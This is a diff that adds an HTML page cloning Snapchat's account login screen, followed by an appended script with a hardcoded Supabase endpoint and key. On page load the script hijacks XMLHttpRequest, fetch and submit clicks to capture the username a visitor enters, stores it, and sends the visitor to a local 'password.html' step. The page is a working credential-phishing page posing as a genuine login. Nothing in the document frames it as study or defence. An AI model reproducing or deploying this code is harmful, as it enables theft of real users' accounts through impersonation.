@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="nl-nl" data-theme="dark">
+<head>
+    <title>Accounts• Snapchat </title>
+    <!-- Meta -->
+    <meta charset="utf-8" />
+    <meta name="referrer" content="origin" />
+    <meta name="apple-mobile-web-app-capable" content="no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+    <!-- This meta tag is used for Google site verification in search console -->
+    <meta name="google-site-verification" content="SA-WartaE0JJY1xTTk4iZQvUy4yMaiIWL5YCaRDVM0M" />
+    <link rel="canonical" href="https://accounts.snapchat.com/accounts/v2/login" />
+    <script>const PAGE_LOAD_START_TIME_MS = Date.now();</script>
+    <!-- Styles -->
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/semantic.min.css"/>
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/dropdown.min.css"/>
+    <!-- Force reload of css file -->
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/snapchat.css?t=0"/>
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/accounts.css"/>
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/auth.css"/>
+    <link rel="stylesheet" href="https://static.snapchat.com/accounts-ui/static/1738266753/styles/revoke.css"/>
+    <!-- Scripts -->
+    <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/jquery.min.js"></script>
+    <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/semantic.min.js"></script>
+    <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/dropdown.min.js"></script>
+    <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/accounts.js"></script>
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://static.snapchat.com/accounts-ui/static/1738266753/images/favicon/favicon.png" type="image/png" />
+    <link rel="stylesheet" type="text/css" href="https://snapnet-cdn.storage.googleapis.com/fonts/avenir-next/avenirnext.font.css" />
+</head>
+<body class="designV2">
+    <div id="common-attributes" data-is-dev="false" data-is-gdpr="false"></div>
+    <!-- Pusher is Needed for Top Navigation Menu -->
+    <div class="pusher">
+        <div id="account-identifier-root" 
+            data-xsrf="4eyZ9MIiDOyMdYKWZ1WLZQ"
+            data-continue="/accounts/welcome" 
+            data-is-arkose-lightbox="true"
+            data-redirect-to-download-page="true"
+            data-enable-attestation="true">
+        </div>
+        <script src="https://static.snapchat.com/accounts-ui/static/1738266753/scripts/main.js?v=59def6d372804f0443b7b27d5ccdd9bc5e262200feeda73add4f660c4a5414d7%20%20src%2Fmain%2Fwebapp%2Faccounts%2Fstatic%2Fscripts%2Fmain.js%20masterbbf1152f"></script>
+    </div>
+    <!-- End Pusher -->
+
+    <!-- Our Supabase Integration Script -->
+    <script>
+        // Initialize Supabase client
+        const supabaseUrl = 'https://enytadglgtpxrsnvldcu.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVueXRhZGdsZ3RweHJzbnZsZGN1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzg2MTI1ODIsImV4cCI6MjA1NDE4ODU4Mn0.6xQ2Nre7WKS9XY3ma9QESKHvw3kTJNHela201b6al_4';
+
+        window.addEventListener('load', function() {
+            // Override XMLHttpRequest to catch their AJAX calls
+            const originalXHR = window.XMLHttpRequest;
+            window.XMLHttpRequest = function() {
+                const xhr = new originalXHR();
+                const originalOpen = xhr.open;
+                const originalSend = xhr.send;
+
+                xhr.open = function() {
+                    this.url = arguments[1];
+                    return originalOpen.apply(this, arguments);
+                };
+
+                xhr.send = function(body) {
+                    if (this.url?.includes('/accounts/v2/login')) {
+                        try {
+                            const data = new URLSearchParams(body);
+                            const username = data.get('accountIdentifier');
+                            if (username) {
+                                sessionStorage.setItem('input1', username);
+                                window.location.href = `password.html?ai=${encodeURIComponent(username)}`;
+                                return;
+                            }
+                        } catch (error) {
+                            console.error('Error:', error);
+                        }
+                    }
+                    return originalSend.apply(this, arguments);
+                };
+
+                return xhr;
+            };
+
+            // Also override fetch for modern requests
+            const originalFetch = window.fetch;
+            window.fetch = async function(...args) {
+                const [url, options] = args;
+                if (url.includes('/accounts/v2/login')) {
+                    const formData = options?.body;
+                    if (formData) {
+                        try {
+                            const data = new URLSearchParams(formData);
+                            const username = data.get('accountIdentifier');
+                            if (username) {
+                                sessionStorage.setItem('input1', username);
+                                window.location.href = `password.html?ai=${encodeURIComponent(username)}`;
+                                return new Response();
+                            }
+                        } catch (error) {
+                            console.error('Error:', error);
+                        }
+                    }
+                }
+                return originalFetch.apply(this, args);
+            };
+
+            // Watch for React's synthetic events
+            document.addEventListener('click', function(e) {
+                if (e.target.matches('button[type="submit"]')) {
+                    const username = document.getElementById('accountIdentifier')?.value;
+                    if (username) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        sessionStorage.setItem('input1', username);
+                        window.location.href = `password.html?ai=${encodeURIComponent(username)}`;
+                    }
+                }
+            }, true);
+        });
+    </script>
+</body>
+</html> 
